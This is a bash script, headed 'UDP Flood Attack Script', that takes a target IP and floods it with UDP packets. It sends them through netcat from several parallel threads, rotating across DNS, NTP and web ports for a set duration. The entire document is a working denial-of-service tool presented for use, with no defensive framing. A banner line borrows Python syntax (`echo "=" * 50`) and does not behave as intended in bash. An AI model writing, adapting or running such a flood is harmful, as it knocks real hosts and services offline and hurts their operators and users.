#!/bin/bash

# UDP Flood Attack Script

TARGET="$1"
DURATION="${2:-60}"
THREADS="${3:-5}"

if [ -z "$TARGET" ]; then
    echo "Usage: ./udp_flood.sh <target_ip> [duration] [threads]"
    echo "Example: ./udp_flood.sh 192.168.1.5 60 5"
    exit 1
fi

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "[!] Warning: UDP flood works better with root privileges"
fi

echo "[+] Starting UDP Flood attack"
echo "[+] Target: $TARGET"
echo "[+] Duration: $DURATION seconds"
echo "[+] Threads: $THREADS"
echo "[+] Ports: 53, 123, 80, 443, 8080 (rotating)"
echo "=" * 50

# Ports to target
PORTS=(53 123 80 443 8080 9000)

# Function to send UDP packets
send_udp() {
    local thread_id=$1
    local port=$2
    
    local packet_count=0
    local start_time=$(date +%s)
    
    while [ $(($(date +%s) - start_time)) -lt $DURATION ]; do
        echo "UDP_FLOOD_$(date +%s)_${RANDOM}_T${thread_id}" | \
            timeout 0.5 nc -u -w1 "$TARGET" "$port" 2>/dev/null &
        
        packet_count=$((packet_count + 1))
        
        if [ $((packet_count % 100)) -eq 0 ]; then
            echo "[Thread $thread_id] Port $port: $packet_count packets"
        fi
        
        sleep 0.01
    done
    
    echo "[Thread $thread_id] Finished: $packet_count packets to port $port"
}

# Start attack threads
PIDS=()
for ((i=1; i<=THREADS; i++)); do
    port=${PORTS[$(( (i-1) % ${#PORTS[@]} ))]}
    send_udp $i $port &
    PIDS+=($!)
    echo "[+] Started thread $i attacking port $port (PID: ${PIDS[-1]})"
    sleep 0.1
done

echo ""
echo "[+] All threads started"
echo "[+] Attack will run for $DURATION seconds"
echo ""
echo "Press Ctrl+C to stop attack early"
echo ""

# Wait for duration
sleep $DURATION

# Cleanup
echo ""
echo "[+] Stopping attack..."
kill ${PIDS[@]} 2>/dev/null
pkill -f "nc.*$TARGET" 2>/dev/null

echo "[+] Attack completed"
echo "=" * 50
